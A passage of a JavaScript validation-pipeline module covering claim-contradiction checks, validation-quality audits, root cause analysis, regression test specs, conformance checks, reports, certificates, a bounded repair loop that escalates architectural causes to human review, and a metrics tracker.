  if (passAll && someFail) {
    contradictions.push({
      claim_id: 'cross_claim',
      type: 'SCOPE_MISMATCH',
      severity: 'HIGH',
      resolution:
        '"All tests pass" claim is contradicted by specific failing test. Narrow the scope of the passing claim.',
      supporting_evidence: evidenceSet.filter(e => /all.*pass/i.test(e.description || '')),
      contradicting_evidence: evidenceSet.filter(
        e => /fail/i.test(e.description || '') && e.supports === false,
      ),
    });
  }

  return contradictions;
}

// ============================================================================
// 11. VALIDATION QUALITY AUDITOR (SECTIONS 53–54)
// ============================================================================

/**
 * Audit the quality of validation itself — does the test prove the claim?
 *
 * @param {Array} claims
 * @param {Array} evidence
 * @param {Array} tests
 * @returns {Object} Validation quality report
 */
function auditValidationQuality(claims, evidence, tests) {
  const findings = [];
  const falseConfidenceRisks = [];

  // Check for claims without any test coverage
  const testedClaimIds = new Set((tests || []).map(t => t.claim_id));
  for (const claim of claims || []) {
    if (!testedClaimIds.has(claim.claim_id)) {
      findings.push({
        type: 'UNTESTED_CLAIM',
        severity: 'HIGH',
        claim_id: claim.claim_id,
        claim: claim.claim,
        message: `Claim "${claim.claim}" has no corresponding test`,
      });
    }
  }

  // Check for tests that pass but don't actually prove the claim
  // (e.g., unit tests pass but no integration test for distributed system claim)
  for (const claim of claims || []) {
    const claimTests = (tests || []).filter(t => t.claim_id === claim.claim_id);
    const claimEvidence = (evidence || []).filter(e => e.claim_id === claim.claim_id);

    if (claim.category === CLAIM_CATEGORIES.CONCURRENCY) {
      const hasConcurrencyTest = claimTests.some(t => t.type === 'concurrency');
      if (!hasConcurrencyTest) {
        falseConfidenceRisks.push({
          type: 'FALSE_CONFIDENCE',
          severity: 'CRITICAL',
          claim_id: claim.claim_id,
          claim: claim.claim,
          message:
            'Concurrency claim lacks concurrent execution test. Unit tests alone cannot verify thread safety.',
        });
      }
    }

    if (claim.category === CLAIM_CATEGORIES.SECURITY) {
      const hasSecurityTest = claimTests.some(
        t => t.type === 'security' || t.variant === 'sql_injection' || t.variant === 'xss',
      );
      if (!hasSecurityTest) {
        falseConfidenceRisks.push({
          type: 'FALSE_CONFIDENCE',
          severity: 'CRITICAL',
          claim_id: claim.claim_id,
          claim: claim.claim,
          message:
            'Security claim lacks security-specific test. General functional tests do not prove security.',
        });
      }
    }

    if (claim.category === CLAIM_CATEGORIES.PERFORMANCE) {
      const hasBenchmark = claimEvidence.some(e =>
        /benchmark|load_test|latency/i.test(e.type || ''),
      );
      if (!hasBenchmark) {
        falseConfidenceRisks.push({
          type: 'FALSE_CONFIDENCE',
          severity: 'HIGH',
          claim_id: claim.claim_id,
          claim: claim.claim,
          message: 'Performance claim lacks benchmark evidence. Code review cannot verify latency.',
        });
      }
    }

    if (claim.category === CLAIM_CATEGORIES.IDEMPOTENCY) {
      const hasIdempotencyTest = claimTests.some(t => t.type === 'idempotency');
      if (!hasIdempotencyTest) {
        falseConfidenceRisks.push({
          type: 'FALSE_CONFIDENCE',
          severity: 'CRITICAL',
          claim_id: claim.claim_id,
          claim: claim.claim,
          message:
            'Idempotency claim lacks duplicate request test. Single-execution tests cannot verify idempotency.',
        });
      }
    }
  }

  return {
    total_claims: (claims || []).length,
    tested_claims: testedClaimIds.size,
    coverage_rate: (claims || []).length > 0 ? testedClaimIds.size / claims.length : 0,
    findings,
    false_confidence_risks: falseConfidenceRisks,
    quality_score: calculateQualityScore(claims, findings, falseConfidenceRisks),
  };
}

/**
 * Calculate validation quality score (0–100).
 */
function calculateQualityScore(claims, findings, risks) {
  if (!claims || claims.length === 0) return 0;
  let score = 100;
  score -= (findings || []).filter(f => f.severity === 'HIGH').length * 10;
  score -= (findings || []).filter(f => f.severity === 'MEDIUM').length * 5;
  score -= (risks || []).filter(r => r.severity === 'CRITICAL').length * 15;
  score -= (risks || []).filter(r => r.severity === 'HIGH').length * 8;
  return Math.max(0, Math.min(100, score));
}

// ============================================================================
// 12. ROOT CAUSE ANALYSIS (SECTION 36)
// ============================================================================

/**
 * Analyze root cause of a failure.
 *
 * @param {Object} failure
 * @returns {Object} Root cause analysis
 */
function analyzeRootCause(failure) {
  if (!failure) return { analysis: [], depth: 0 };

  const chain = [];
  const symptom = failure.symptom || failure.error || failure.message || 'Unknown failure';

  chain.push({
    level: ROOT_CAUSE_TYPES.OBSERVED,
    description: `Observed: ${symptom}`,
    evidence: failure.evidence || [],
  });

  // Immediate cause inference
  const immediateMap = [
    {
      match: /(?:timeout|timed out|deadline exceeded)/i,
      cause: 'External service or database call exceeded timeout threshold',
    },
    {
      match: /(?:connection refused|ECONNREFUSED)/i,
      cause: 'Downstream service is not running or unreachable',
    },
    {
      match: /(?:null|undefined|cannot read property)/i,
      cause: 'Missing null check on potentially absent value',
    },
    {
      match: /(?:unique constraint|duplicate key)/i,
      cause: 'Duplicate insertion attempted without idempotency guard',
    },
    {
      match: /(?:foreign key|reference)/i,
      cause: 'Referential integrity violation — referenced entity does not exist',
    },
    {
      match: /(?:auth|unauthorized|forbidden|401|403)/i,
      cause: 'Authentication or authorization check failed',
    },
    {
      match: /(?:out of memory|heap|OOM)/i,
      cause: 'Memory exhaustion — possible unbounded allocation or memory leak',
    },
    {
      match: /(?:deadlock)/i,
      cause:
        'Database or distributed deadlock — concurrent transactions acquired locks in conflicting order',
    },
    {
      match: /(?:rate limit|429|too many request)/i,
      cause: 'Rate limit exceeded on external dependency',
    },
  ];

  for (const im of immediateMap) {
    if (im.match.test(symptom)) {
      chain.push({
        level: ROOT_CAUSE_TYPES.IMMEDIATE,
        description: `Immediate Cause: ${im.cause}`,
        evidence: [],
      });
      break;
    }
  }

  // Contributing cause
  chain.push({
    level: ROOT_CAUSE_TYPES.CONTRIBUTING,
    description:
      'Contributing Cause: Requires investigation — check logs, traces, and recent changes',
    evidence: [],
  });

  // Systemic cause
  chain.push({
    level: ROOT_CAUSE_TYPES.SYSTEMIC,
    description: 'Systemic Cause: Requires architecture and process review',
    evidence: [],
  });

  return {
    analysis: chain,
    depth: chain.length,
    failure_category: categorizeFailure(symptom),
    requires_architecture_review: chain.length >= 3,
  };
}

/**
 * Categorize a failure into a taxonomy.
 */
function categorizeFailure(symptom) {
  const s = (symptom || '').toLowerCase();
  if (/timeout|latency|slow/i.test(s)) return 'performance';
  if (/auth|permission|forbidden/i.test(s)) return 'security';
  if (/duplicate|unique|idempoten/i.test(s)) return 'data_integrity';
  if (/deadlock|race|concurrent/i.test(s)) return 'concurrency';
  if (/null|undefined|type/i.test(s)) return 'functional';
  if (/memory|oom|heap/i.test(s)) return 'resource';
  if (/connection|network|dns/i.test(s)) return 'network';
  return 'unknown';
}

// ============================================================================
// 13. REGRESSION TEST GENERATOR (SECTION 37)
// ============================================================================

/**
 * Generate a regression test from a verified bug.
 *
 * @param {Object} bug
 * @returns {Object} Regression test specification
 */
function generateRegressionTest(bug) {
  if (!bug) return null;

  return {
    name: `regression_${(bug.id || Date.now().toString(36)).replace(/[^a-zA-Z0-9]/g, '_')}`,
    description: `Regression test for: ${bug.title || bug.description || 'Unknown bug'}`,
    preconditions: bug.reproduction_steps || [],
    input: bug.trigger_input || {},
    expected_behavior: bug.expected || 'No failure',
    assertion: `Verify that the bug "${bug.title || 'Unknown'}" does not recur`,
    original_failure: bug.symptom || bug.error || '',
    category: categorizeFailure(bug.symptom || bug.error || ''),
    priority: 'HIGH',
    automated: true,
    permanent: true,
  };
}

// ============================================================================
// 14. ARCHITECTURE CONFORMANCE (SECTION 38)
// ============================================================================

/**
 * Check implementation conformance against ADR.
 *
 * @param {Object} implementation
 * @param {Object} adr
 * @returns {Object} Conformance report
 */
function checkConformance(implementation, adr) {
  const violations = [];
  const conforming = [];

  if (!implementation || !adr) {
    return {
      violations,
      conforming,
      status: 'CANNOT_EVALUATE',
      reason: 'Missing implementation or ADR data',
    };
  }

  const decision = adr.decision || {};

  // Check required capabilities
  const requiredCaps = (adr.context && adr.context.functional_requirements) || [];
  const implComponents = implementation.components || [];

  for (const req of requiredCaps) {
    const found = implComponents.some(c =>
      (c.name || '').toLowerCase().includes((req.requirement || '').toLowerCase()),
    );
    if (found) {
      conforming.push({ requirement: req.requirement, status: 'PRESENT' });
    } else {
      violations.push({
        type: 'MISSING_COMPONENT',
        severity: 'HIGH',
        requirement: req.requirement,
        message: `Required component for "${req.requirement}" not found in implementation`,
      });
    }
  }

  // Check for unauthorized dependencies
  if (
    implementation.unauthorized_dependencies &&
    implementation.unauthorized_dependencies.length > 0
  ) {
    for (const dep of implementation.unauthorized_dependencies) {
      violations.push({
        type: 'UNAUTHORIZED_DEPENDENCY',
        severity: 'MEDIUM',
        dependency: dep,
        message: `Dependency "${dep}" not authorized in ADR`,
      });
    }
  }

  return {
    violations,
    conforming,
    status: violations.length === 0 ? 'CONFORMING' : 'VIOLATIONS_FOUND',
    violation_count: violations.length,
    conformance_rate:
      conforming.length + violations.length > 0
        ? conforming.length / (conforming.length + violations.length)
        : 1,
  };
}

// ============================================================================
// 15. VALIDATION ORCHESTRATOR (SECTIONS 42–43)
// ============================================================================

/**
 * Orchestrate the full validation pipeline.
 *
 * @param {Object} params
 * @returns {Object} Validation result
 */
function orchestrateValidation(params) {
  const {
    taskQuery,
    requirements,
    architecture,
    implementation,
    level = VALIDATION_LEVELS.STANDARD,
  } = params;

  // Step 1: Extract claims
  const claims = extractClaims(taskQuery, requirements, architecture);

  // Step 2: Generate tests
  const tests = generateTests(claims, architecture);

  // Step 3: Generate properties
  const properties = generateProperties(claims);

  // Step 4: Generate adversarial tests (if level >= DEEP)
  let adversarialTests = [];
  if (
    [VALIDATION_LEVELS.DEEP, VALIDATION_LEVELS.ADVERSARIAL, VALIDATION_LEVELS.CHAOS].includes(level)
  ) {
    adversarialTests = generateAdversarialTests(claims, architecture);
  }

  // Step 5: Domain-specific validators
  const domainValidations = {};
  const securityClaims = claims.filter(
    c => c.category === CLAIM_CATEGORIES.SECURITY || c.category === CLAIM_CATEGORIES.AUTHORIZATION,
  );
  if (securityClaims.length > 0) {
    domainValidations.security = validateSecurity(implementation);
  }

  const concurrencyClaims = claims.filter(c => c.category === CLAIM_CATEGORIES.CONCURRENCY);
  if (concurrencyClaims.length > 0) {
    domainValidations.concurrency = validateConcurrency();
  }

  const idempotencyClaims = claims.filter(c => c.category === CLAIM_CATEGORIES.IDEMPOTENCY);
  if (idempotencyClaims.length > 0) {
    domainValidations.idempotency = validateIdempotency();
  }

  const reliabilityClaims = claims.filter(c => c.category === CLAIM_CATEGORIES.RELIABILITY);
  if (reliabilityClaims.length > 0) {
    domainValidations.retry = validateRetry();
  }

  const apiClaims = claims.filter(c => c.category === CLAIM_CATEGORIES.API_CONTRACT);
  if (apiClaims.length > 0) {
    domainValidations.api_contract = validateAPIContract(implementation);
  }

  const consistencyClaims = claims.filter(
    c =>
      c.category === CLAIM_CATEGORIES.CONSISTENCY || c.category === CLAIM_CATEGORIES.DATA_INTEGRITY,
  );
  if (consistencyClaims.length > 0) {
    domainValidations.database = validateDatabase();
  }

  // Step 6: Build evidence graph
  const evidenceGraph = buildEvidenceGraph(
    requirements || { functional: [], non_functional: [], constraints: [] },
    claims,
    [],
  );

  // Step 7: Audit validation quality
  const qualityAudit = auditValidationQuality(claims, [], tests);

  // Step 8: Architecture conformance (if ADR exists)
  let conformance = null;
  if (architecture && architecture.adr) {
    conformance = checkConformance(implementation || {}, architecture.adr);
  }

  return {
    task: taskQuery,
    level,
    claims: {
      total: claims.length,
      items: claims,
      by_category: groupBy(claims, 'category'),
      by_importance: groupBy(claims, 'importance'),
    },
    tests: {
      functional: tests.length,
      properties: properties.length,
      adversarial: adversarialTests.length,
      total: tests.length + properties.length + adversarialTests.length,
      items: tests,
      property_items: properties,
      adversarial_items: adversarialTests,
    },
    domain_validations: domainValidations,
    evidence_graph: evidenceGraph,
    quality_audit: qualityAudit,
    conformance,
    verification_status: {
      verified: 0,
      disproved: 0,
      unverified: claims.length,
      inconclusive: 0,
    },
  };
}

/**
 * Group array items by a key.
 */
function groupBy(arr, key) {
  const groups = {};
  for (const item of arr || []) {
    const k = item[key] || 'unknown';
    if (!groups[k]) groups[k] = [];
    groups[k].push(item);
  }
  return groups;
}

// ============================================================================
// 16. VALIDATION REPORT (SECTION 46)
// ============================================================================

/**
 * Generate a human-readable validation report.
 *
 * @param {Object} validationResult
 * @returns {Object} Report
 */
function generateReport(validationResult) {
  if (!validationResult) return { summary: 'No validation result provided' };

  const vr = validationResult;
  return {
    title: `Validation Report: ${vr.task || 'Unknown Task'}`,
    date: new Date().toISOString(),
    summary: {
      total_claims: vr.claims ? vr.claims.total : 0,
      total_tests: vr.tests ? vr.tests.total : 0,
      verified: vr.verification_status ? vr.verification_status.verified : 0,
      disproved: vr.verification_status ? vr.verification_status.disproved : 0,
      unverified: vr.verification_status ? vr.verification_status.unverified : 0,
      quality_score: vr.quality_audit ? vr.quality_audit.quality_score : 0,
    },
    claims: vr.claims || {},
    tests: vr.tests || {},
    domain_validations: vr.domain_validations || {},
    conformance: vr.conformance || null,
    quality_audit: vr.quality_audit || null,
    evidence_graph: vr.evidence_graph || null,
    recommendations: generateRecommendations(vr),
  };
}

/**
 * Generate recommendations based on validation findings.
 */
function generateRecommendations(vr) {
  const recs = [];

  if (vr.quality_audit) {
    for (const risk of vr.quality_audit.false_confidence_risks || []) {
      recs.push({
        priority: risk.severity === 'CRITICAL' ? 'CRITICAL' : 'HIGH',
        recommendation: risk.message,
        claim_id: risk.claim_id,
      });
    }
    for (const finding of vr.quality_audit.findings || []) {
      recs.push({
        priority: finding.severity,
        recommendation: finding.message,
        claim_id: finding.claim_id,
      });
    }
  }

  if (vr.conformance && vr.conformance.violations) {
    for (const v of vr.conformance.violations) {
      recs.push({
        priority: v.severity,
        recommendation: v.message,
        claim_id: null,
      });
    }
  }

  return recs;
}

// ============================================================================
// 17. VALIDATION CERTIFICATE (SECTION 47)
// ============================================================================

/**
 * Generate a machine-readable validation certificate.
 *
 * @param {Object} validationResult
 * @returns {Object} Certificate
 */
function generateCertificate(validationResult) {
  if (!validationResult) return null;

  const vr = validationResult;
  return {
    certificate_id: `CERT-${crypto.randomUUID ? crypto.randomUUID().slice(0, 8) : Date.now().toString(36)}`,
    issued_at: new Date().toISOString(),
    task: vr.task || 'Unknown',
    environment: process.env.NODE_ENV || 'development',
    claims_verified: vr.verification_status ? vr.verification_status.verified : 0,
    claims_unverified: vr.verification_status ? vr.verification_status.unverified : 0,
    claims_disproved: vr.verification_status ? vr.verification_status.disproved : 0,
    tests_executed: vr.tests ? vr.tests.total : 0,
    security_checks:
      vr.domain_validations && vr.domain_validations.security ? 'INCLUDED' : 'NOT_INCLUDED',
    performance_checks: 'SPECIFICATION_ONLY',
    failure_injections: vr.domain_validations ? Object.keys(vr.domain_validations).length : 0,
    evidence_coverage: vr.evidence_graph ? vr.evidence_graph.coverage : 0,
    quality_score: vr.quality_audit ? vr.quality_audit.quality_score : 0,
    limitations: [
      'This certificate represents validation specifications, not live test execution.',
      'Performance claims require benchmark execution for full verification.',
      'Security claims should be supplemented with penetration testing.',
    ],
    conformance_status: vr.conformance ? vr.conformance.status : 'NOT_EVALUATED',
  };
}

// ============================================================================
// 18. AUTONOMOUS REPAIR LOOP (SECTIONS 35–36)
// ============================================================================

const MAX_REPAIR_ITERATIONS = 3;
const MAX_REPAIR_FILES = 5;

/**
 * Attempt to repair a failure.
 *
 * @param {Object} failure
 * @param {Object} implementation
 * @returns {Object} Repair result
 */
function attemptRepair(failure, implementation) {
  if (!failure) return { status: REPAIR_STATUS.FAILED, reason: 'No failure provided' };

  // Root cause analysis
  const rootCause = analyzeRootCause(failure);

  // Generate repair plan
  const repairPlan = {
    root_cause: rootCause,
    proposed_fix: generateRepairProposal(failure, rootCause),
    affected_files: [],
    regression_test: generateRegressionTest({
      id: failure.id || `bug-${Date.now()}`,
      title: failure.title || failure.symptom || 'Unknown',
      symptom: failure.symptom || failure.error || '',
      description: failure.description || '',
      reproduction_steps: failure.reproduction_steps || [],
      expected: failure.expected || 'No failure',
    }),
    max_iterations: MAX_REPAIR_ITERATIONS,
    max_files: MAX_REPAIR_FILES,
    bounded: true,
  };

  // Check if repair is within bounds
  if (rootCause.requires_architecture_review) {
    return {
      status: REPAIR_STATUS.ESCALATED,
      reason: 'Root cause is architectural. Automated repair is not appropriate.',
      repair_plan: repairPlan,
      escalation_reason: 'Architectural root cause detected — requires human review.',
    };
  }

  return {
    status: REPAIR_STATUS.ATTEMPTED,
    repair_plan: repairPlan,
    bounded: true,
    limits: { max_iterations: MAX_REPAIR_ITERATIONS, max_files: MAX_REPAIR_FILES },
  };
}

/**
 * Generate a repair proposal based on root cause analysis.
 */
function generateRepairProposal(failure, rootCause) {
  const category = rootCause.failure_category || 'unknown';
  const proposals = {
    performance: 'Add timeout, implement caching, or optimize query',
    security: 'Add authentication/authorization check, sanitize input',
    data_integrity: 'Add idempotency guard, unique constraint, or validation',
    concurrency: 'Add locking, use optimistic concurrency control, or serialize access',
    functional: 'Fix null check, add type validation, or correct business logic',
    resource: 'Add resource limits, fix memory leak, or implement streaming',
    network: 'Add retry with backoff, implement circuit breaker, or add timeout',
  };
  return proposals[category] || 'Investigate further and apply targeted fix';
}

// ============================================================================
// 19. PHASE 8 METRICS TRACKER
// ============================================================================

class Phase8MetricsTracker {
  constructor() {
    this.metrics = {
      claim_extraction_accuracy: { correct: 0, total: 0 },
      evidence_coverage: { covered: 0, total: 0 },
      verification_rate: { verified: 0, total: 0 },
      contradiction_detection: { detected: 0, total: 0 },
      false_confidence_detection: { detected: 0, total: 0 },
      repair_success_rate: { succeeded: 0, total: 0 },
      regression_coverage: { covered: 0, total: 0 },
      drift_detection: { detected: 0, total: 0 },
      validation_blind_spot_detection: { detected: 0, total: 0 },
    };
  }

  record(metric, success) {
    if (this.metrics[metric]) {
      this.metrics[metric].total++;
      if (success) {
        const key = Object.keys(this.metrics[metric]).find(k => k !== 'total');
        if (key) this.metrics[metric][key]++;
      }
    }
  }

  getMetrics() {
    const result = {};
    for (const [key, val] of Object.entries(this.metrics)) {
      result[key] = {
        ...val,
        rate: val.total > 0 ? val[Object.keys(val).find(k => k !== 'total')] / val.total : 0,
      };
    }
    return result;
  }
}

let _phase8MetricsTracker = null;

function getPhase8MetricsTracker() {
  if (!_phase8MetricsTracker) {
    _phase8MetricsTracker = new Phase8MetricsTracker();
  }
  return _phase8MetricsTracker;
}

// ============================================================================
// EXPORTS
// ============================================================================

module.exports = {
  // Constants
  CLAIM_STATUS,
  CLAIM_CATEGORIES,
  EVIDENCE_QUALITY,
  VALIDATION_LEVELS,
  ROOT_CAUSE_TYPES,
  REPAIR_STATUS,

  // Claim Extraction (§4–§5)
  extractClaims,

  // Evidence Graph (§6)
  buildEvidenceGraph,

  // Test Generation (§7–§8)
  generateTests,

  // Property-Based Validation (§9)
  generateProperties,

  // Adversarial Testing (§11)
  generateAdversarialTests,

  // Domain Validators (§12–§20)
  validateConcurrency,
  validateIdempotency,
  validateRetry,
  validateDistributed,
  validateDatabase,
  validateAPIContract,
  validateSecurity,

  // Evidence Quality (§28–§29)
  classifyEvidenceQuality,

  // Claim Verification (§30)
  verifyClaim,

  // Contradiction Detection (§31)
  detectContradictions,

  // Validation Quality (§53–§54)
  auditValidationQuality,

  // Root Cause Analysis (§36)
  analyzeRootCause,

  // Regression Generator (§37)
  generateRegressionTest,

  // Architecture Conformance (§38)
  checkConformance,

  // Validation Orchestrator (§42–§43)
  orchestrateValidation,

  // Report (§46)
  generateReport,

  // Certificate (§47)
  generateCertificate,

  // Repair Loop (§35–§36)
  attemptRepair,

  // Metrics
  Phase8MetricsTracker,
  getPhase8MetricsTracker,
};
